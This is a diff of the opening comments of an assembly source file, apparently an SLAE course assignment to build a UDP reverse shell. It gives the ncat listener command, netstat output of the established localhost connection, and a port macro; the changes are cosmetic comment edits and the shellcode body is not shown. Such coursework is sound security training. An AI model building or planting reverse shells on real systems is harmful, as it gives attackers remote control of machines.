@@ -1,12 +1,12 @@
 ; SLAE-X 
-; thanks to writesup from previou students
-; syscall available here /usr/include/linux/net.h
-; assignment : 2. create a reverse shell  
-; originality : using UDP instead TCP 
+; thanks to writesup from previou students :] 
+; assignment: 2. create a reverse shell  
+; originality: using UDP instead TCP 
 ; usage : ncat -lup 1234 on the receiving end 
+; 
 ; udp        0      0 127.0.0.1:49955         127.0.0.1:1234          ESTABLISHED 4359/udprevshell
 ; udp        0      0 127.0.0.1:1234          127.0.0.1:49955         ESTABLISHED 4358/ncat 
-;
+
 
 %define htons(x) ((x >> 8) & 0xFF) | ((x & 0xFF) << 8)
 %define _port 1234              ; port  
